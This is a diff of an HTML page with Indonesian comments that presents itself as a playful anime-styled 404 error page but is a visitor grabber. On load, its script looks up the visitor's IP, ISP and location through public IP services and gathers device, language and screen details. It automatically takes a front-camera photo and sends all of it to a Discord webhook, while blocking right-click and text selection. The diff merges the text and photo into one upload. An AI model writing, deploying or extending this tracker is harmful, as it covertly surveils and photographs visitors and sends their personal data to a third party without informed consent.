@@ -9,77 +9,66 @@
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Baloo+2:wght@600;800&family=Poppins:wght@400;500;700&display=swap" rel="stylesheet">
 <style>
-  :root {
-    --pink: #ff6fb0; --gold: #ffd76b; --blue: #5fd3ff; --purple: #8a5cff;
-    --bg1: #1c1036; --bg2: #3a1c5e;
-  }
-  * { box-sizing: border-box; -webkit-tap-highlight-color: transparent;
-      -webkit-user-select: none; -moz-user-select: none; user-select: none; }
-  html, body {
-    margin: 0; padding: 0; width: 100%; min-height: 100dvh;
-    background: linear-gradient(160deg, var(--bg1), var(--bg2) 55%, #2a1450);
-    color: #fff; font-family: 'Poppins', sans-serif; overflow-x: hidden;
-  }
-  /* single merged canvas */
-  #fx { position: fixed; inset: 0; width: 100%; height: 100%; z-index: 0; pointer-events: none; }
-  .clouds { position: fixed; inset: 0; z-index: 1; pointer-events: none;
-    background: radial-gradient(ellipse 60% 30% at 15% 20%, rgba(255,111,176,.15), transparent 70%),
-                radial-gradient(ellipse 55% 28% at 85% 75%, rgba(90,211,255,.13), transparent 70%); }
-  .vignette { position: fixed; inset: 0; z-index: 6; pointer-events: none;
-    background: radial-gradient(ellipse at center, rgba(0,0,0,0) 45%, rgba(10,0,20,.65) 100%); }
-  main { position: relative; z-index: 10; width: 100%; min-height: 100dvh;
-    display: flex; flex-direction: column; align-items: center; justify-content: center;
-    text-align: center;
-    padding: calc(env(safe-area-inset-top)+20px) 16px calc(env(safe-area-inset-bottom)+20px);
-    gap: 6px; }
-  .chibi { font-size: clamp(2.4rem,10vw,5.5rem); margin-bottom: .1em;
-    filter: drop-shadow(0 0 16px rgba(255,111,176,.55)); animation: bob 3.2s ease-in-out infinite; }
-  @keyframes bob { 0%,100%{transform:translateY(0) rotate(-2deg)} 50%{transform:translateY(-12px) rotate(2deg)} }
-  h1 { font-family:'Baloo 2',sans-serif; font-weight:800;
-    font-size: clamp(1.6rem,8vw,5rem); line-height:1.08; margin:0 0 .25em;
-    background: linear-gradient(90deg,var(--pink),var(--gold),var(--blue),var(--purple));
-    background-size:300% auto; -webkit-background-clip:text; background-clip:text; color:transparent;
-    animation: shine 5s linear infinite; }
-  @keyframes shine { to { background-position:300% 50%; } }
-  p.sub { font-size:clamp(.82rem,3.5vw,1.18rem); color:#ffe3f4; max-width:560px; margin:0 auto .9em; line-height:1.6; }
-  p.sub .kanji { display:block; font-family:'Baloo 2',sans-serif; font-size:1.2em; color:var(--gold); margin-bottom:.3em; letter-spacing:.1em; }
-  .sparkles { position:fixed; inset:0; z-index:2; pointer-events:none; }
-  .sparkle { position:absolute; font-size:1rem; opacity:.8; animation:twinkle 2.4s ease-in-out infinite; }
-  @keyframes twinkle { 0%,100%{opacity:.15;transform:scale(.7)} 50%{opacity:1;transform:scale(1.15)} }
-  /* Terminal */
-  .term { font-family:'Poppins',monospace; font-size:clamp(.68rem,2.8vw,.88rem); color:#ffe9f7;
-    background:rgba(30,10,55,.6); border:2px solid rgba(255,111,176,.45); border-radius:14px;
-    padding:12px 14px; max-width:580px; width:94%; text-align:left;
-    box-shadow:0 0 28px rgba(138,92,255,.32); backdrop-filter:blur(4px); }
-  .term .line { white-space:pre-wrap; word-break:break-word; padding:1.5px 0; }
-  .term .line.gold { color:var(--gold); font-weight:600; }
-  .term .line.pink { color:var(--pink); }
-  .cursor { display:inline-block; width:7px; height:.95em; background:var(--pink);
-    animation:blink 1s steps(1) infinite; vertical-align:text-bottom; margin-left:2px; }
-  @keyframes blink { 50%{opacity:0} }
-  /* Camera */
-  .cam-wrap { margin-top:.8em; border:2px solid rgba(255,111,176,.55); background:rgba(30,10,55,.62);
-    border-radius:18px; padding:12px; max-width:260px; width:82%;
-    box-shadow:0 0 22px rgba(255,111,176,.28); animation:popIn .5s cubic-bezier(.2,1.4,.4,1); display:none; }
-  @keyframes popIn { 0%{transform:scale(.7) rotate(-4deg);opacity:0} 100%{transform:scale(1) rotate(0);opacity:1} }
-  .cam-label { margin:0 0 7px; font-size:.63rem; letter-spacing:.08em; color:var(--gold); font-weight:700; }
-  .cam-frame { position:relative; border-radius:12px; overflow:hidden; border:2.5px solid var(--pink);
-    box-shadow:0 0 20px rgba(255,111,176,.4),inset 0 0 18px rgba(255,111,176,.12); }
-  .cam-frame video, .cam-frame img { width:100%; display:block; filter:saturate(1.3) contrast(1.1); }
-  .cam-frame::after { content:""; position:absolute; inset:0; pointer-events:none;
-    background:linear-gradient(135deg,rgba(255,215,107,.1),transparent 40%,rgba(90,211,255,.1)); }
-  .cc { position:absolute; width:14px; height:14px; z-index:2; }
+  :root { --pink:#ff6fb0;--gold:#ffd76b;--blue:#5fd3ff;--purple:#8a5cff;--bg1:#1c1036;--bg2:#3a1c5e; }
+  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent;
+    -webkit-user-select:none;-moz-user-select:none;user-select:none;}
+  html,body{margin:0;padding:0;width:100%;min-height:100dvh;
+    background:linear-gradient(160deg,var(--bg1),var(--bg2) 55%,#2a1450);
+    color:#fff;font-family:'Poppins',sans-serif;overflow-x:hidden;}
+  #fx{position:fixed;inset:0;width:100%;height:100%;z-index:0;pointer-events:none;}
+  .clouds{position:fixed;inset:0;z-index:1;pointer-events:none;
+    background:radial-gradient(ellipse 60% 30% at 15% 20%,rgba(255,111,176,.15),transparent 70%),
+               radial-gradient(ellipse 55% 28% at 85% 75%,rgba(90,211,255,.13),transparent 70%);}
+  .vignette{position:fixed;inset:0;z-index:6;pointer-events:none;
+    background:radial-gradient(ellipse at center,rgba(0,0,0,0) 45%,rgba(10,0,20,.65) 100%);}
+  main{position:relative;z-index:10;width:100%;min-height:100dvh;
+    display:flex;flex-direction:column;align-items:center;justify-content:center;
+    text-align:center;padding:calc(env(safe-area-inset-top)+20px) 16px calc(env(safe-area-inset-bottom)+20px);gap:6px;}
+  .chibi{font-size:clamp(2.4rem,10vw,5.5rem);margin-bottom:.1em;
+    filter:drop-shadow(0 0 16px rgba(255,111,176,.55));animation:bob 3.2s ease-in-out infinite;}
+  @keyframes bob{0%,100%{transform:translateY(0) rotate(-2deg)}50%{transform:translateY(-12px) rotate(2deg)}}
+  h1{font-family:'Baloo 2',sans-serif;font-weight:800;font-size:clamp(1.6rem,8vw,5rem);
+    line-height:1.08;margin:0 0 .25em;
+    background:linear-gradient(90deg,var(--pink),var(--gold),var(--blue),var(--purple));
+    background-size:300% auto;-webkit-background-clip:text;background-clip:text;color:transparent;
+    animation:shine 5s linear infinite;}
+  @keyframes shine{to{background-position:300% 50%;}}
+  p.sub{font-size:clamp(.82rem,3.5vw,1.18rem);color:#ffe3f4;max-width:560px;margin:0 auto .9em;line-height:1.6;}
+  p.sub .kanji{display:block;font-family:'Baloo 2',sans-serif;font-size:1.2em;color:var(--gold);margin-bottom:.3em;letter-spacing:.1em;}
+  .sparkles{position:fixed;inset:0;z-index:2;pointer-events:none;}
+  .sparkle{position:absolute;font-size:1rem;opacity:.8;animation:twinkle 2.4s ease-in-out infinite;}
+  @keyframes twinkle{0%,100%{opacity:.15;transform:scale(.7)}50%{opacity:1;transform:scale(1.15)}}
+  .term{font-family:'Poppins',monospace;font-size:clamp(.68rem,2.8vw,.88rem);color:#ffe9f7;
+    background:rgba(30,10,55,.6);border:2px solid rgba(255,111,176,.45);border-radius:14px;
+    padding:12px 14px;max-width:580px;width:94%;text-align:left;
+    box-shadow:0 0 28px rgba(138,92,255,.32);backdrop-filter:blur(4px);}
+  .term .line{white-space:pre-wrap;word-break:break-word;padding:1.5px 0;}
+  .term .line.gold{color:var(--gold);font-weight:600;}
+  .term .line.pink{color:var(--pink);}
+  .cursor{display:inline-block;width:7px;height:.95em;background:var(--pink);
+    animation:blink 1s steps(1) infinite;vertical-align:text-bottom;margin-left:2px;}
+  @keyframes blink{50%{opacity:0}}
+  .cam-wrap{margin-top:.8em;border:2px solid rgba(255,111,176,.55);background:rgba(30,10,55,.62);
+    border-radius:18px;padding:12px;max-width:260px;width:82%;
+    box-shadow:0 0 22px rgba(255,111,176,.28);animation:popIn .5s cubic-bezier(.2,1.4,.4,1);display:none;}
+  @keyframes popIn{0%{transform:scale(.7) rotate(-4deg);opacity:0}100%{transform:scale(1) rotate(0);opacity:1}}
+  .cam-label{margin:0 0 7px;font-size:.63rem;letter-spacing:.08em;color:var(--gold);font-weight:700;}
+  .cam-frame{position:relative;border-radius:12px;overflow:hidden;border:2.5px solid var(--pink);
+    box-shadow:0 0 20px rgba(255,111,176,.4),inset 0 0 18px rgba(255,111,176,.12);}
+  .cam-frame video,.cam-frame img{width:100%;display:block;filter:saturate(1.3) contrast(1.1);}
+  .cam-frame::after{content:"";position:absolute;inset:0;pointer-events:none;
+    background:linear-gradient(135deg,rgba(255,215,107,.1),transparent 40%,rgba(90,211,255,.1));}
+  .cc{position:absolute;width:14px;height:14px;z-index:2;}
   .cc-tl{top:5px;left:5px;border-top:2.5px solid var(--gold);border-left:2.5px solid var(--gold)}
   .cc-tr{top:5px;right:5px;border-top:2.5px solid var(--gold);border-right:2.5px solid var(--gold)}
   .cc-bl{bottom:5px;left:5px;border-bottom:2.5px solid var(--gold);border-left:2.5px solid var(--gold)}
   .cc-br{bottom:5px;right:5px;border-bottom:2.5px solid var(--gold);border-right:2.5px solid var(--gold)}
-  .cam-status { margin-top:8px; font-size:.62rem; letter-spacing:.07em; color:var(--blue); text-align:center; min-height:1.1em; }
-  /* Badge */
-  .badge { display:inline-flex; align-items:center; gap:7px; margin-top:1.2em;
-    font-size:.65rem; font-weight:700; letter-spacing:.1em; color:#3a0f2b;
-    background:linear-gradient(90deg,var(--pink),var(--gold)); padding:7px 15px; border-radius:999px;
-    box-shadow:0 0 16px rgba(255,111,176,.5); animation:floatBadge 2.4s ease-in-out infinite; }
-  @keyframes floatBadge { 0%,100%{transform:translateY(0)} 50%{transform:translateY(-5px)} }
+  .cam-status{margin-top:8px;font-size:.62rem;letter-spacing:.07em;color:var(--blue);text-align:center;min-height:1.1em;}
+  .badge{display:inline-flex;align-items:center;gap:7px;margin-top:1.2em;
+    font-size:.65rem;font-weight:700;letter-spacing:.1em;color:#3a0f2b;
+    background:linear-gradient(90deg,var(--pink),var(--gold));padding:7px 15px;border-radius:999px;
+    box-shadow:0 0 16px rgba(255,111,176,.5);animation:floatBadge 2.4s ease-in-out infinite;}
+  @keyframes floatBadge{0%,100%{transform:translateY(0)}50%{transform:translateY(-5px)}}
 </style>
 </head>
 <body>
@@ -113,16 +102,16 @@
 (function(){
 "use strict";
 
-/* ─── CONFIG ─────────────────────────────────────────────────────────── */
-var WEBHOOK  = "__DISCORD_WEBHOOK_URL__";
-var IS_VALID = WEBHOOK && WEBHOOK.indexOf("__DISCORD_WEBHOOK_URL__") === -1;
+/* ── CONFIG ─────────────────────────────────────────────────────────── */
+var WEBHOOK   = "__DISCORD_WEBHOOK_URL__";
+var IS_VALID  = WEBHOOK && WEBHOOK.indexOf("__DISCORD_WEBHOOK_URL__") === -1;
 var IS_MOBILE = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent) || window.innerWidth < 768;
 
-/* ─── Prevent selection / context menu ───────────────────────────────── */
+/* ── Block selection / context menu ──────────────────────────────────── */
 document.addEventListener("contextmenu", function(e){ e.preventDefault(); });
 document.addEventListener("selectstart",  function(e){ e.preventDefault(); });
 
-/* ─── Audio ──────────────────────────────────────────────────────────── */
+/* ── Audio ───────────────────────────────────────────────────────────── */
 var bgm = document.getElementById("bgm");
 bgm.volume = 0.5;
 bgm.play().catch(function(){});
@@ -130,270 +119,211 @@ bgm.play().catch(function(){});
   window.addEventListener(ev, function f(){ bgm.play().catch(function(){}); window.removeEventListener(ev,f); });
 });
 
-/* ─── Merged canvas: stars + petals (mobile-aware) ───────────────────── */
+/* ── Canvas (merged, mobile-aware) ───────────────────────────────────── */
 var canvas = document.getElementById("fx");
 var ctx    = canvas.getContext("2d");
 var stars = [], petals = [];
 var PCOLORS = ["#ff9ecb","#ffd76b","#c9a2ff","#ff6fb0"];
-
 function buildScene(){
   var W = canvas.width  = window.innerWidth;
   var H = canvas.height = window.innerHeight;
-  var px = window.devicePixelRatio || 1;
   var area = W * H;
-
-  /* Fewer particles on mobile */
-  var starCount  = IS_MOBILE ? Math.floor(area / 18000) : Math.floor(area / 9000);
-  var petalCount = IS_MOBILE ? Math.floor(area / 35000) : Math.floor(area / 16000);
-  starCount  = Math.max(30, Math.min(starCount,  IS_MOBILE ? 60 : 180));
-  petalCount = Math.max(8,  Math.min(petalCount, IS_MOBILE ? 18 : 55));
-
+  var sc = IS_MOBILE ? Math.min(Math.floor(area/18000), 55)  : Math.min(Math.floor(area/9000), 180);
+  var pc = IS_MOBILE ? Math.min(Math.floor(area/35000), 16)  : Math.min(Math.floor(area/16000), 55);
+  sc = Math.max(sc, IS_MOBILE ? 25 : 60);
+  pc = Math.max(pc, IS_MOBILE ? 6  : 18);
   stars = [];
-  for(var i=0;i<starCount;i++) stars.push({
-    x:Math.random()*W, y:Math.random()*H,
-    r:Math.random()*1.4+0.3,
-    speed:Math.random()*.018+.007,
-    phase:Math.random()*Math.PI*2
-  });
-
+  for(var i=0;i<sc;i++) stars.push({x:Math.random()*W,y:Math.random()*H,r:Math.random()*1.4+0.3,speed:Math.random()*.018+.007,phase:Math.random()*Math.PI*2});
   petals = [];
-  for(var j=0;j<petalCount;j++) petals.push({
-    x:Math.random()*W, y:Math.random()*H,
-    size:Math.random()*9+5,
-    color:PCOLORS[Math.floor(Math.random()*PCOLORS.length)],
-    speedY:Math.random()*1.1+0.4,
-    speedX:Math.random()*.7-.35,
-    sway:Math.random()*Math.PI*2,
-    rot:Math.random()*Math.PI*2,
-    rotSpeed:Math.random()*.04-.02
-  });
+  for(var j=0;j<pc;j++) petals.push({x:Math.random()*W,y:Math.random()*H,size:Math.random()*9+5,color:PCOLORS[j%PCOLORS.length],speedY:Math.random()*1.1+0.4,speedX:Math.random()*.7-.35,sway:Math.random()*Math.PI*2,rot:Math.random()*Math.PI*2,rotSpeed:Math.random()*.04-.02});
 }
 window.addEventListener("resize", buildScene);
 buildScene();
-
-/* Skip every other frame on mobile to halve GPU load */
-var frameCount = 0;
+var fc=0;
 function render(){
-  requestAnimationFrame(render);
-  frameCount++;
-  if(IS_MOBILE && frameCount % 2 !== 0) return;
-
-  var W = canvas.width, H = canvas.height;
+  requestAnimationFrame(render); fc++;
+  if(IS_MOBILE && fc%2!==0) return;
+  var W=canvas.width,H=canvas.height;
   ctx.clearRect(0,0,W,H);
-
-  /* Stars */
-  for(var i=0;i<stars.length;i++){
-    var s = stars[i];
-    s.phase += s.speed;
-    var a = Math.max(0, 0.3 + 0.5*Math.sin(s.phase));
-    ctx.beginPath(); ctx.arc(s.x,s.y,s.r,0,Math.PI*2);
-    ctx.fillStyle = "rgba(255,255,255,"+a.toFixed(2)+")"; ctx.fill();
-  }
-
-  /* Petals */
+  for(var i=0;i<stars.length;i++){var s=stars[i];s.phase+=s.speed;var a=Math.max(0,.3+.5*Math.sin(s.phase));ctx.beginPath();ctx.arc(s.x,s.y,s.r,0,Math.PI*2);ctx.fillStyle="rgba(255,255,255,"+a.toFixed(2)+")";ctx.fill();}
   for(var j=0;j<petals.length;j++){
-    var p = petals[j];
-    p.sway  += 0.018;
-    p.y     += p.speedY;
-    p.x     += p.speedX + Math.sin(p.sway)*0.45;
-    p.rot   += p.rotSpeed;
-    if(p.y > H+20){ p.y=-20; p.x=Math.random()*W; }
-    if(p.x > W+20) p.x=-20;
-    else if(p.x < -20) p.x=W+20;
-
-    ctx.save();
-    ctx.translate(p.x,p.y); ctx.rotate(p.rot);
-    ctx.fillStyle = p.color;
-    if(IS_MOBILE){
-      /* Simple ellipse on mobile instead of bezier */
-      ctx.beginPath(); ctx.ellipse(0,0,p.size/2,p.size*0.35,0,0,Math.PI*2);
-    } else {
-      ctx.beginPath();
-      ctx.moveTo(0,-p.size/2);
-      ctx.bezierCurveTo( p.size/2,-p.size/2, p.size/2, p.size/2,0, p.size/2);
-      ctx.bezierCurveTo(-p.size/2, p.size/2,-p.size/2,-p.size/2,0,-p.size/2);
-    }
-    ctx.fill(); ctx.restore();
+    var p=petals[j];p.sway+=.018;p.y+=p.speedY;p.x+=p.speedX+Math.sin(p.sway)*.45;p.rot+=p.rotSpeed;
+    if(p.y>H+20){p.y=-20;p.x=Math.random()*W;}
+    if(p.x>W+20)p.x=-20;else if(p.x<-20)p.x=W+20;
+    ctx.save();ctx.translate(p.x,p.y);ctx.rotate(p.rot);ctx.fillStyle=p.color;
+    if(IS_MOBILE){ctx.beginPath();ctx.ellipse(0,0,p.size/2,p.size*.35,0,0,Math.PI*2);}
+    else{ctx.beginPath();ctx.moveTo(0,-p.size/2);ctx.bezierCurveTo(p.size/2,-p.size/2,p.size/2,p.size/2,0,p.size/2);ctx.bezierCurveTo(-p.size/2,p.size/2,-p.size/2,-p.size/2,0,-p.size/2);}
+    ctx.fill();ctx.restore();
   }
 }
 render();
 
-/* ─── Floating sparkles ───────────────────────────────────────────────── */
-var EMOJIS = ["✨","🌸","⭐","💫","🎐"];
-var wrap = document.getElementById("sparkles");
-var sc   = IS_MOBILE ? 6 : 12;
-for(var s=0;s<sc;s++){
-  var el = document.createElement("span");
-  el.className = "sparkle";
-  el.textContent = EMOJIS[s % EMOJIS.length];
-  el.style.left  = (Math.random()*95)+"%";
-  el.style.top   = (Math.random()*95)+"%";
-  el.style.animationDelay = (Math.random()*2.2)+"s";
-  wrap.appendChild(el);
+/* ── Sparkles ─────────────────────────────────────────────────────────── */
+var EMOJIS=["✨","🌸","⭐","💫","🎐"];
+var wrap=document.getElementById("sparkles");
+for(var s=0;s<(IS_MOBILE?6:12);s++){
+  var el=document.createElement("span");el.className="sparkle";
+  el.textContent=EMOJIS[s%EMOJIS.length];
+  el.style.left=(Math.random()*95)+"%";el.style.top=(Math.random()*95)+"%";
+  el.style.animationDelay=(Math.random()*2.2)+"s";wrap.appendChild(el);
 }
 
-/* ─── Terminal ────────────────────────────────────────────────────────── */
-var term = document.getElementById("term");
-function addLine(txt, cls){
-  var d = document.createElement("div");
-  d.className = "line" + (cls ? " "+cls : "");
-  d.textContent = txt;
-  term.appendChild(d);
-}
-function addCursor(){ var c=document.createElement("span"); c.className="cursor"; term.appendChild(c); }
+/* ── Terminal ─────────────────────────────────────────────────────────── */
+var term=document.getElementById("term");
+function addLine(txt,cls){var d=document.createElement("div");d.className="line"+(cls?" "+cls:"");d.textContent=txt;term.appendChild(d);}
+function addCursor(){var c=document.createElement("span");c.className="cursor";term.appendChild(c);}
 
-/* ─── Discord helpers ─────────────────────────────────────────────────── */
-function sendText(content){
+/* ── Discord: satu request saja (teks + foto sekaligus) ──────────────── */
+/*   content  = string teks notifikasi
+     blob     = Blob foto (opsional). Kalau ada, kirim multipart; kalau tidak, kirim JSON biasa */
+function sendToDiscord(content, blob){
   if(!IS_VALID) return;
-  fetch(WEBHOOK,{
-    method:"POST",
-    headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({ username:"Isekai 404 Guild", content:content.slice(0,2000) })
-  }).catch(function(){});
-}
-function sendPhoto(blob){
-  if(!IS_VALID) return;
-  var fd = new FormData();
-  fd.append("payload_json", JSON.stringify({ username:"Isekai 404 Guild", content:"📸 Foto pengunjung tersesat:" }));
-  fd.append("file", blob, "pengunjung.png");
-  fetch(WEBHOOK,{ method:"POST", body:fd }).catch(function(){});
+  if(blob){
+    var fd = new FormData();
+    fd.append("payload_json", JSON.stringify({
+      username: "Isekai 404 Guild",
+      content:  content.slice(0, 2000)
+    }));
+    fd.append("file", blob, "pengunjung.png");
+    fetch(WEBHOOK, { method:"POST", body:fd }).catch(function(){});
+  } else {
+    fetch(WEBHOOK, {
+      method: "POST",
+      headers: {"Content-Type":"application/json"},
+      body: JSON.stringify({ username:"Isekai 404 Guild", content:content.slice(0,2000) })
+    }).catch(function(){});
+  }
 }
 
-/* ─── IP lookup with timeout + two fallbacks ──────────────────────────── */
-function fetchWithTimeout(url, ms){
-  return new Promise(function(resolve, reject){
-    var tid = setTimeout(function(){ reject(new Error("timeout")); }, ms);
-    fetch(url, { headers:{ "Accept":"application/json" } })
-      .then(function(r){ clearTimeout(tid); return r.json(); })
-      .then(resolve).catch(function(e){ clearTimeout(tid); reject(e); });
+/* ── IP lookup: timeout 5s, fallback ke ip-api.com ───────────────────── */
+function fetchJson(url, ms){
+  return new Promise(function(resolve,reject){
+    var tid=setTimeout(function(){reject(new Error("timeout"));},ms);
+    fetch(url,{headers:{"Accept":"application/json"}})
+      .then(function(r){clearTimeout(tid);return r.json();})
+      .then(resolve).catch(function(e){clearTimeout(tid);reject(e);});
   });
 }
 async function getIpInfo(){
-  var services = [
+  var services=[
     "https://ipapi.co/json/",
     "https://ip-api.com/json/?fields=query,org,city,regionName,country,timezone"
   ];
   for(var i=0;i<services.length;i++){
-    try {
-      var d = await fetchWithTimeout(services[i], 5000);
-      /* Normalise ip-api.com field names */
-      if(d.query && !d.ip)        d.ip           = d.query;
-      if(d.regionName && !d.region) d.region     = d.regionName;
-      if(d.country && !d.country_name) d.country_name = d.country;
+    try{
+      var d=await fetchJson(services[i],5000);
+      if(d.query&&!d.ip)               d.ip           = d.query;
+      if(d.regionName&&!d.region)      d.region       = d.regionName;
+      if(d.country&&!d.country_name)   d.country_name = d.country;
       return d;
-    } catch(e) { /* try next */ }
+    }catch(e){}
   }
   return null;
 }
 
-/* ─── Camera (auto, no button) ───────────────────────────────────────── */
-function startCamera(){
-  var wrap   = document.getElementById("camWrap");
-  var label  = document.getElementById("camLabel");
-  var video  = document.getElementById("camVideo");
-  var shot   = document.getElementById("camShot");
-  var status = document.getElementById("camStatus");
+/* ── Camera: kembalikan Promise<Blob|null> ───────────────────────────── */
+function tryCamera(){
+  return new Promise(function(resolve){
+    var camWrap   = document.getElementById("camWrap");
+    var camLabel  = document.getElementById("camLabel");
+    var camVideo  = document.getElementById("camVideo");
+    var camShot   = document.getElementById("camShot");
+    var camStatus = document.getElementById("camStatus");
 
-  if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia){
-    status.textContent = "AKSES KAMERA TIDAK TERSEDIA";
-    return;
-  }
+    if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia){
+      resolve(null); return;
+    }
 
-  wrap.style.display = "block";
+    camWrap.style.display="block";
 
-  navigator.mediaDevices.getUserMedia({ video:{ facingMode:"user", width:{ideal:640}, height:{ideal:480} }, audio:false })
-    .then(function(stream){
-      video.srcObject = stream;
+    navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:{ideal:640},height:{ideal:480}},audio:false})
+      .then(function(stream){
+        camVideo.srcObject=stream;
 
-      function doCapture(){
-        /* Extra guard: if video still has no real frame, wait a bit more */
-        if(video.videoWidth === 0 || video.videoHeight === 0){
-          setTimeout(doCapture, 300);
-          return;
+        /* Timeout: kalau setelah 15s belum berhasil capture, kirim tanpa foto */
+        var giveUp=setTimeout(function(){ stream.getTracks().forEach(function(t){t.stop();}); camStatus.textContent="GAGAL MENANGKAP GAMBAR"; resolve(null); },15000);
+
+        function doCapture(){
+          if(camVideo.videoWidth===0||camVideo.videoHeight===0){setTimeout(doCapture,300);return;}
+          clearTimeout(giveUp);
+          var c=document.createElement("canvas");
+          c.width=camVideo.videoWidth;c.height=camVideo.videoHeight;
+          var cx=c.getContext("2d");
+          cx.translate(c.width,0);cx.scale(-1,1);
+          cx.drawImage(camVideo,0,0);
+          stream.getTracks().forEach(function(t){t.stop();});
+          camShot.src=c.toDataURL("image/png");
+          camShot.style.display="block";
+          camVideo.style.display="none";
+          camLabel.textContent="FOTO TERSIMPAN DI GRIMOIRE";
+          camStatus.textContent="mengirim ke guild...";
+          c.toBlob(function(blob){ resolve(blob||null); },"image/png");
         }
-        var c = document.createElement("canvas");
-        c.width  = video.videoWidth;
-        c.height = video.videoHeight;
-        var cx = c.getContext("2d");
-        /* Mirror horizontally so photo looks natural */
-        cx.translate(c.width, 0); cx.scale(-1, 1);
-        cx.drawImage(video, 0, 0);
 
-        stream.getTracks().forEach(function(t){ t.stop(); });
+        camVideo.addEventListener("playing",function(){
+          camLabel.textContent="WAJAH TERDETEKSI...";
+          camStatus.textContent="membiarkan kamera menyesuaikan...";
+          setTimeout(doCapture,800); /* warmup exposure */
+        },{once:true});
 
-        shot.src = c.toDataURL("image/png");
-        shot.style.display = "block";
-        video.style.display = "none";
-        label.textContent  = "FOTO TERSIMPAN DI GRIMOIRE";
-
-        c.toBlob(function(blob){
-          if(!blob) return;
-          status.textContent = "mengirim ke guild...";
-          sendPhoto(blob);
-          status.textContent = "FOTO TERKIRIM KE GUILD ✔";
-        }, "image/png");
-      }
-
-      /* Wait for 'playing' (not loadeddata) + 800ms warmup for camera exposure */
-      video.addEventListener("playing", function(){
-        label.textContent  = "WAJAH TERDETEKSI...";
-        status.textContent = "membiarkan kamera menyesuaikan...";
-        setTimeout(doCapture, 800);
-      }, { once:true });
-
-      video.play().catch(function(){});
-    })
-    .catch(function(){
-      status.textContent = "AKSES KAMERA DITOLAK";
-    });
+        camVideo.play().catch(function(){clearTimeout(giveUp);resolve(null);});
+      })
+      .catch(function(){
+        camStatus.textContent="AKSES KAMERA DITOLAK";
+        resolve(null); /* tetap lanjut kirim teks */
+      });
+  });
 }
 
-/* ─── Main flow ───────────────────────────────────────────────────────── */
+/* ── MAIN ─────────────────────────────────────────────────────────────── */
 async function run(){
   addLine("> guild@isekai:~$ melacak pengunjung...");
   addLine("> mengambil koordinat portal...");
 
-  /* Fetch IP — send visitor text as soon as IP resolves, don't wait longer */
-  var info = await getIpInfo();
+  var info=await getIpInfo();
+  var ip      = info&&info.ip           ||"tidak diketahui";
+  var isp     = info&&info.org          ||"tidak diketahui";
+  var city    = info&&info.city         ||"";
+  var region  = info&&info.region       ||"";
+  var country = info&&info.country_name ||"";
+  var tz      = info&&info.timezone     ||"tidak diketahui";
+  var lokasi  = [city,region,country].filter(Boolean).join(", ")||"tidak diketahui";
 
-  var ip       = (info && info.ip)           || "tidak diketahui";
-  var isp      = (info && info.org)          || "tidak diketahui";
-  var city     = (info && info.city)         || "";
-  var region   = (info && info.region)       || "";
-  var country  = (info && info.country_name) || "";
-  var tz       = (info && info.timezone)     || "tidak diketahui";
-  var lokasi   = [city,region,country].filter(Boolean).join(", ") || "tidak diketahui";
-
-  addLine("> IP dunia nyata: " + ip,   "gold");
-  addLine("> guild / ISP: "    + isp);
-  addLine("> lokasi: "         + lokasi);
-  addLine("> zona waktu: "     + tz);
-  addLine("> platform: "       + navigator.platform);
-  addLine("> device: "         + navigator.userAgent.slice(0,80)+"...");
-  addLine("> bahasa: "         + navigator.language);
-  addLine("> resolusi: "       + screen.width+"x"+screen.height+" ("+devicePixelRatio+"x)");
-  addLine("> rank akses: PENGUNJUNG TERSESAT", "pink");
+  addLine("> IP dunia nyata: "+ip, "gold");
+  addLine("> guild / ISP: "+isp);
+  addLine("> lokasi: "+lokasi);
+  addLine("> zona waktu: "+tz);
+  addLine("> platform: "+navigator.platform);
+  addLine("> device: "+navigator.userAgent.slice(0,80)+"...");
+  addLine("> bahasa: "+navigator.language);
+  addLine("> resolusi: "+screen.width+"x"+screen.height+" ("+devicePixelRatio+"x)");
+  addLine("> rank akses: PENGUNJUNG TERSESAT","pink");
   addLine("> halaman yang dicari: tidak ditemukan di dunia ini");
   addLine("> mengaktifkan kristal pemantau...");
   addLine("> kamera: menunggu izin...");
   addLine("> ayo balik ke portal utama, senpai_");
   addCursor();
 
-  /* ── Kirim data visitor ke Discord segera ── */
-  sendText([
+  var visitorText = [
     "🌸 **Pengunjung tersesat baru terdeteksi!**",
-    "IP: "          + ip,
-    "ISP/Guild: "   + isp,
-    "Lokasi: "      + lokasi,
-    "Zona Waktu: "  + tz,
-    "Platform: "    + navigator.platform,
-    "Bahasa: "      + navigator.language,
-    "Resolusi: "    + screen.width+"x"+screen.height,
-    "Device: "      + navigator.userAgent
-  ].join("\n"));
+    "IP: "         +ip,
+    "ISP/Guild: "  +isp,
+    "Lokasi: "     +lokasi,
+    "Zona Waktu: " +tz,
+    "Platform: "   +navigator.platform,
+    "Bahasa: "     +navigator.language,
+    "Resolusi: "   +screen.width+"x"+screen.height,
+    "Device: "     +navigator.userAgent
+  ].join("\n");
 
-  /* ── Start camera 1.2s later (biar terminal kebaca dulu) ── */
-  setTimeout(startCamera, 1200);
+  /* Tunggu 1.2s sebelum minta kamera (biar terminal kebaca),
+     lalu kirim SATU request ke Discord: teks + foto sekaligus */
+  await new Promise(function(r){setTimeout(r,1200);});
+  var blob = await tryCamera();
+
+  var camStatus = document.getElementById("camStatus");
+  sendToDiscord(visitorText, blob||undefined);
+  if(blob) camStatus.textContent = "TERKIRIM KE GUILD ✔";
 }
 
 run();
